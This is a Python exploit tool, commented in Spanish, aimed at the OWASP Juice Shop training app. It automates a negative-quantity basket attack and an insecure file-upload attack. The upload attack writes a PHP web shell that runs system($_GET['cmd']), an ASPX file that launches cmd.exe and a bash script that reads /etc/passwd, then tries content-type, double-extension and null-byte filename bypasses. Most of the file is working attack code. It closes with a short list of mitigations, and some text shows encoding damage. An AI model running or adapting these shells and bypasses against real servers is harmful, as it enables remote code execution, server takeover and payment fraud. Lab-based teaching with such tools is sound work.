#!/usr/bin/env python3
"""
Combined Exploit Tool - OWASP Juice Shop
Vulnerabilidad 8: Input Validation en Cantidades Negativas
Vulnerabilidad 9: File Upload Inseguro
Autor: Security Researcher
"""

import requests
import json
import time
import os
import random
import string
from urllib.parse import urljoin
import mimetypes

class JuiceShopCombinedExploit:
    def __init__(self, target_url="http://localhost:3000", auth_token=None):
        self.target_url = target_url
        self.session = requests.Session()
        
        if auth_token:
            self.session.headers.update({
                'Authorization': f'Bearer {auth_token}',
                'Content-Type': 'application/json'
            })
    
    def login(self, email, password):
        """Iniciar sesiÃ³n para obtener token"""
        try:
            response = self.session.post(
                urljoin(self.target_url, '/rest/user/login'),
                json={'email': email, 'password': password}
            )
            
            if response.status_code == 200:
                token = response.json().get('authentication', {}).get('token')
                if token:
                    self.session.headers.update({'Authorization': f'Bearer {token}'})
                    print(f"[+] Login exitoso como: {email}")
                    return True
            return False
        except Exception as e:
            print(f"[-] Error durante login: {e}")
            return False

    # =============================================
    # VULNERABILIDAD 8: CANTIDADES NEGATIVAS
    # =============================================
    
    def get_basket_id(self):
        """Obtener el ID del carrito del usuario actual"""
        try:
            response = self.session.get(urljoin(self.target_url, '/rest/basket/'))
            if response.status_code == 200:
                return response.json().get('data', {}).get('id')
        except:
            return None
        return None
    
    def add_product_to_basket(self, product_id, quantity=1):
        """AÃ±adir producto al carrito con cantidad especÃ­fica"""
        basket_id = self.get_basket_id()
        if not basket_id:
            print("[-] No se pudo obtener el carrito")
            return False
        
        payload = {
            "ProductId": product_id,
            "BasketId": str(basket_id),
            "quantity": quantity
        }
        
        try:
            response = self.session.post(
                urljoin(self.target_url, '/api/BasketItems/'),
                json=payload
            )
            
            if response.status_code in [200, 201]:
                print(f"[+] Producto {product_id} aÃ±adido con cantidad: {quantity}")
                return response.json().get('data', {}).get('id')
            else:
                print(f"[-] Error aÃ±adiendo producto: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def update_basket_item_quantity(self, basket_item_id, new_quantity):
        """Actualizar cantidad de un item en el carrito"""
        payload = {
            "quantity": new_quantity
        }
        
        try:
            response = self.session.put(
                urljoin(self.target_url, f'/api/BasketItems/{basket_item_id}'),
                json=payload
            )
            
            if response.status_code == 200:
                print(f"[+] Cantidad actualizada a: {new_quantity}")
                return True
            else:
                print(f"[-] Error actualizando cantidad: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def get_basket_items(self):
        """Obtener todos los items del carrito"""
        try:
            response = self.session.get(urljoin(self.target_url, '/rest/basket/'))
            if response.status_code == 200:
                basket_data = response.json()
                return basket_data.get('data', {}).get('Products', [])
        except:
            return []
        return []
    
    def exploit_negative_quantities(self):
        """Explotar vulnerabilidad de cantidades negativas"""
        print("\n" + "="*50)
        print("   VULNERABILIDAD 8: CANTIDADES NEGATIVAS")
        print("   CategorÃ­a OWASP: A05:2021-Security Misconfiguration")
        print("="*50)
        
        # Paso 1: AÃ±adir producto normal
        print("\n[1] AÃ±adiendo producto normal al carrito...")
        basket_item_id = self.add_product_to_basket(1, 1)  # Apple Juice
        
        if not basket_item_id:
            print("[-] No se pudo aÃ±adir producto al carrito")
            return False
        
        # Paso 2: Cambiar cantidad a negativa
        print("\n[2] Explotando validaciÃ³n de cantidades...")
        negative_quantities = [-1, -5, -10, -100, -999]
        
        for quantity in negative_quantities:
            print(f"  ğŸ¯ Probando cantidad: {quantity}")
            if self.update_basket_item_quantity(basket_item_id, quantity):
                print(f"  ğŸ’¥ VULNERABLE: Sistema aceptÃ³ cantidad {quantity}")
                
                # Verificar impacto financiero
                basket_items = self.get_basket_items()
                if basket_items:
                    item = basket_items[0]
                    actual_qty = item.get('BasketItem', {}).get('quantity', 0)
                    price = float(item.get('price', 0))
                    total_value = actual_qty * price
                    
                    print(f"  ğŸ“Š Impacto: {actual_qty} x ${price} = ${total_value:.2f}")
                    
                    if total_value < 0:
                        print("  ğŸš¨ IMPACTO CRÃTICO: Valor negativo alcanzado!")
        
        # Paso 3: Ataque avanzado con mÃºltiples productos
        print("\n[3] Ataque avanzado con mÃºltiples productos negativos...")
        
        # Limpiar carrito primero
        self.clean_basket()
        
        # AÃ±adir mÃºltiples productos con cantidades negativas
        products = [
            {"id": 1, "name": "Apple Juice", "price": 1.99},
            {"id": 2, "name": "Orange Juice", "price": 2.99},
            {"id": 3, "name": "Melon Basket", "price": 8.99}
        ]
        
        for product in products:
            self.add_product_to_basket(product["id"], -2)
            time.sleep(0.5)
        
        # Calcular impacto total
        basket_items = self.get_basket_items()
        total_negative_value = 0
        
        print("\n  ğŸ“‹ Resumen del carrito negativo:")
        for item in basket_items:
            quantity = item.get('BasketItem', {}).get('quantity', 0)
            price = float(item.get('price', 0))
            name = item.get('name', 'Unknown')
            item_value = quantity * price
            total_negative_value += item_value
            
            print(f"    ğŸ“¦ {name}: {quantity} x ${price} = ${item_value:.2f}")
        
        print(f"  ğŸ’° VALOR TOTAL NEGATIVO: ${total_negative_value:.2f}")
        
        if total_negative_value < 0:
            print("  ğŸ¯ EXPLOTACIÃ“N EXITOSA: Carrito con valor negativo creado")
            return True
        
        return False
    
    def clean_basket(self):
        """Limpiar el carrito actual"""
        try:
            basket_items = self.get_basket_items()
            for item in basket_items:
                item_id = item.get('BasketItem', {}).get('id')
                if item_id:
                    self.session.delete(urljoin(self.target_url, f'/api/BasketItems/{item_id}'))
            print("[+] Carrito limpiado")
        except:
            pass

    # =============================================
    # VULNERABILIDAD 9: FILE UPLOAD INSEGURO
    # =============================================
    
    def create_malicious_files(self):
        """Crear archivos maliciosos para upload"""
        print("\n" + "="*50)
        print("   VULNERABILIDAD 9: FILE UPLOAD INSEGURO")
        print("   CategorÃ­a OWASP: A03:2021-Injection")
        print("="*50)
        
        files_created = []
        
        # 1. Shell script malicioso
        shell_payload = """#!/bin/bash
echo "=== EXPLOIT EXECUTADO ==="
whoami
id
pwd
ls -la
cat /etc/passwd | head -10
echo "=== FIN EXPLOIT ==="
"""
        
        with open('payload.sh', 'w') as f:
            f.write(shell_payload)
        files_created.append('payload.sh')
        print("[+] Archivo malicioso creado: payload.sh")
        
        # 2. PHP shell
        php_payload = """<?php
echo "PHP Shell Activado\\n";
system($_GET['cmd']);
echo "\\nComando ejecutado";
?>
"""
        
        with open('shell.php', 'w') as f:
            f.write(php_payload)
        files_created.append('shell.php')
        print("[+] Archivo malicioso creado: shell.php")
        
        # 3. Archivo con doble extensiÃ³n
        double_extension = """<%@ Page Language="C#" %>
<%
    Response.Write("ASP.NET Shell");
    System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
%>
"""
        
        with open('image.jpg.aspx', 'w') as f:
            f.write(double_extension)
        files_created.append('image.jpg.aspx')
        print("[+] Archivo malicioso creado: image.jpg.aspx (doble extensiÃ³n)")
        
        return files_created
    
    def upload_file_exploit(self, file_path, bypass_techniques=None):
        """Explotar vulnerabilidad de file upload"""
        print(f"\n[ğŸ“¤] Intentando upload de: {file_path}")
        
        # TÃ©cnicas de bypass comunes
        techniques = bypass_techniques or [
            'original',           # Intento original
            'content_type',       # Cambiar Content-Type
            'double_extension',   # Doble extensiÃ³n
            'null_byte',          # Null byte injection
            'uppercase',          # ExtensiÃ³n en mayÃºsculas
        ]
        
        for technique in techniques:
            print(f"  ğŸ› ï¸  Probando tÃ©cnica: {technique}")
            
            try:
                with open(file_path, 'rb') as file:
                    files = {'file': file}
                    headers = {}
                    modified_filename = os.path.basename(file_path)
                    
                    # Aplicar tÃ©cnicas de bypass
                    if technique == 'content_type':
                        files = {'file': (modified_filename, file, 'image/jpeg')}
                    elif technique == 'double_extension':
                        modified_filename = modified_filename + '.jpg'
                        files = {'file': (modified_filename, file, 'image/jpeg')}
                    elif technique == 'null_byte':
                        modified_filename = modified_filename + '.jpg%00.sh'
                        files = {'file': (modified_filename, file, 'image/jpeg')}
                    elif technique == 'uppercase':
                        modified_filename = modified_filename.upper()
                        files = {'file': (modified_filename, file, 'image/jpeg')}
                    
                    # Enviar request de upload
                    # Nota: En Juice Shop, el endpoint puede variar
                    # Normalmente es /file-upload o similar
                    response = self.session.post(
                        urljoin(self.target_url, '/file-upload'),
                        files=files,
                        headers=headers
                    )
                    
                    print(f"    ğŸ“Š Response: {response.status_code}")
                    
                    if response.status_code in [200, 201]:
                        print(f"    âœ… Ã‰XITO: Upload aceptado con tÃ©cnica {technique}")
                        print(f"    ğŸ“ Response: {response.text[:100]}...")
                        return True
                    else:
                        print(f"    âŒ Rechazado: {response.status_code}")
                        
            except Exception as e:
                print(f"    ğŸ’¥ Error: {e}")
        
        return False
    
    def advanced_file_upload_attack(self):
        """Ataque avanzado de file upload con mÃºltiples tÃ©cnicas"""
        print("\n[ğŸ¯] ATAQUE AVANZADO DE FILE UPLOAD")
        
        # Crear archivos maliciosos
        malicious_files = self.create_malicious_files()
        
        success_count = 0
        for file_path in malicious_files:
            print(f"\n[ğŸ”] Atacando con: {file_path}")
            
            # TÃ©cnicas especÃ­ficas por tipo de archivo
            if file_path.endswith('.sh'):
                techniques = ['original', 'content_type', 'double_extension', 'null_byte']
            elif file_path.endswith('.php'):
                techniques = ['original', 'double_extension', 'uppercase']
            elif file_path.endswith('.aspx'):
                techniques = ['original', 'content_type', 'double_extension']
            else:
                techniques = ['original', 'content_type']
            
            if self.upload_file_exploit(file_path, techniques):
                success_count += 1
                print(f"  ğŸ’£ EXPLOIT EXITOSO: {file_path}")
        
        print(f"\n[ğŸ“ˆ] RESUMEN FILE UPLOAD: {success_count}/{len(malicious_files)} archivos subidos")
        return success_count > 0
    
    def cleanup_files(self, file_list):
        """Limpiar archivos creados temporalmente"""
        for file_path in file_list:
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
                    print(f"[+] Archivo limpiado: {file_path}")
            except:
                pass

    # =============================================
    # EXPLOTACIÃ“N COMBINADA
    # =============================================
    
    def run_complete_exploitation(self):
        """Ejecutar explotaciÃ³n completa de ambas vulnerabilidades"""
        print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘         COMBINED EXPLOIT TOOL                 â•‘
    â•‘         OWASP Juice Shop                      â•‘
    â•‘                                               â•‘
    â•‘     V8: Negative Quantity Validation          â•‘
    â•‘     V9: Insecure File Upload                  â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """)
        
        # Ejecutar explotaciÃ³n de cantidades negativas
        negative_success = self.exploit_negative_quantities()
        
        # Ejecutar explotaciÃ³n de file upload
        file_upload_success = self.advanced_file_upload_attack()
        
        # Generar reporte final
        self.generate_exploitation_report(negative_success, file_upload_success)
    
    def generate_exploitation_report(self, negative_success, file_upload_success):
        """Generar reporte final de explotaciÃ³n"""
        print("\n" + "="*60)
        print("           REPORTE FINAL DE EXPLOTACIÃ“N")
        print("="*60)
        
        print("\nğŸ“Š RESULTADOS:")
        print(f"  âœ… Vulnerabilidad 8 (Cantidades Negativas): {'EXPLOTADA' if negative_success else 'FALLIDA'}")
        print(f"  âœ… Vulnerabilidad 9 (File Upload Inseguro): {'EXPLOTADA' if file_upload_success else 'FALLIDA'}")
        
        print("\nğŸ¯ IMPACTO:")
        if negative_success:
            print("  ğŸ’° ManipulaciÃ³n financiera mediante valores negativos")
            print("  ğŸ“‰ DistorsiÃ³n de mÃ©tricas de negocio")
            print("  ğŸ”„ Posibles reembolsos fraudulentos")
        
        if file_upload_success:
            print("  ğŸ”¥ EjecuciÃ³n remota de cÃ³digo (RCE)")
            print("  ğŸ“ Compromiso del servidor")
            print("  ğŸ¯ Posible toma completa del sistema")
        
        print("\nğŸ›¡ï¸ MITIGACIONES RECOMENDADAS:")
        print("  V8 - ASVS V5.2.2:")
        print("    â€¢ Validar reglas de negocio en server-side")
        print("    â€¢ Rechazar cantidades <= 0")
        print("    â€¢ Implementar lÃ­mites razonables")
        
        print("  V9 - ASVS V7.1.1:")
        print("    â€¢ Validar tipo MIME real del archivo")
        print("    â€¢ Verificar signature del archivo")
        print("    â€¢ Restringir extensiones ejecutables")
        print("    â€¢ Almacenar archivos fuera del webroot")
        
        print("\n" + "="*60)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Combined Exploit Tool - OWASP Juice Shop')
    parser.add_argument('-u', '--url', default='http://localhost:3000', help='URL de Juice Shop')
    parser.add_argument('-e', '--email', help='Email para login')
    parser.add_argument('-p', '--password', help='Password para login')
    parser.add_argument('-t', '--token', help='Token de autenticaciÃ³n')
    
    args = parser.parse_args()
    
    exploit = JuiceShopCombinedExploit(args.url, args.token)
    
    # Login si se proporcionan credenciales
    if args.email and args.password:
        if not exploit.login(args.email, args.password):
            print("[-] No se pudo iniciar sesiÃ³n")
            return
    
    # Ejecutar explotaciÃ³n completa
    exploit.run_complete_exploitation()

if __name__ == "__main__":
    main()
